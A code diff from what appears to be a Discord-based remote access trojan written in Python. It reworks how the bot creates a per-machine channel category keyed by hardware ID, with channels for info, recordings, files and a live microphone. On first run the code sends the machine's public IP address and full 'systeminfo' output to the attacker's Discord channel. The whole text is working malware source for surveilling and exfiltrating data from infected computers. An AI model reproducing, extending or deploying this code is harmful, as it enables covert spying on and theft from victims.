@@ -86,15 +86,36 @@ async def on_ready():
             first_run, category = False, category_name
             break
 
-    category = await client.get_guild(guild_id).create_category(hwid)
-    temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
-    temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
-    if channel_ids['spam'] != None: temp = await client.get_guild(guild_id).create_text_channel('spam', category=category); channel_ids['spam'] = temp.id
-    elif channel_ids['recordings'] != None: temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category); channel_ids['recordings'] = temp.id
-    elif channel_ids['file'] != None: temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category); channel_ids['file'] = temp.id
-    elif channel_ids['voice'] != None: temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id
+    if not first_run:
+        category_channel_names = []
+        for channel in category.channels:
+            category_channel_names.append(channel.name)
+        
+        if 'spam' not in category_channel_names and channel_ids['spam']: 
+            temp = await client.get_guild(guild_id).create_text_channel('spam', category=category)
+            channel_ids['spam'] = temp.id
+        
+        if 'recordings' not in category_channel_names and channel_ids['recordings']: 
+            temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category)
+            channel_ids['recordings'] = temp.id
+
+        if 'file-related' not in category_channel_names and channel_ids['file']: 
+            temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category)
+            channel_ids['file'] = temp.id
+        
+        if 'Live microphone' not in category_channel_names and channel_ids['voice']: 
+            temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
+            channel_ids['voice'] = temp.id
         
     if first_run:
+        category = await client.get_guild(guild_id).create_category(hwid)
+        temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
+        temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
+        if channel_ids['spam'] == True: temp = await client.get_guild(guild_id).create_text_channel('spam', category=category); channel_ids['spam'] = temp.id
+        if channel_ids['recordings'] == True: temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category); channel_ids['recordings'] = temp.id
+        if channel_ids['file'] == True: temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category); channel_ids['file'] = temp.id
+        if channel_ids['voice'] == True: temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id
+
         await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
         await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
         system_info = force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
